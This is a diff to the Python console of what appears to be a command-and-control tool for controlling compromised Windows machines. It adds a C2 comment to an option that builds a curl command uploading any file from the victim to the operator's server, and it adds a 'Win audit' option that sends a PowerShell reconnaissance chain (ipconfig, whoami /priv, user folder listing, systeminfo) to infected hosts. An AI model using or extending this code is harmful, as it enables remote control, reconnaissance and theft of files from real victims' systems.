@@ -25,26 +25,33 @@ def main():
         print("\nMenu:")
         print("1. Exit")
         print("2. New command")
-        print("3. Upload from Win")
+        print("3. Upload from win")
+        print("4. Win audit")
         
         choice = input("Select an option: ").strip()
         
         if choice == "1":
             print("Exit...")
             break
-        elif choice == "2":
+        elif choice == "2": # custom command
             command = input("New command: ").strip()
             if command:
                 send_command_to_server(command, server_url)
             else:
                 print("Error!")
-        elif choice == "3":
+        elif choice == "3": # upload file to C2
             file_path = input("Enter the full file path to upload: ").strip()
             if file_path:
                 upload_command = "curl -F file=@{} {}/upload_file".format(file_path, server_url)
                 send_command_to_server(upload_command, server_url)
             else:
                 print("Error: File path is empty!")
+        elif choice == "4": # audit command
+            command = "powershell -c ipconfig /all; whoami; whoami /priv; dir c:\Users; systeminfo;"
+            if command:
+                send_command_to_server(command, server_url)
+            else:
+                print("Error!")
         else:
             print("Error!")
 
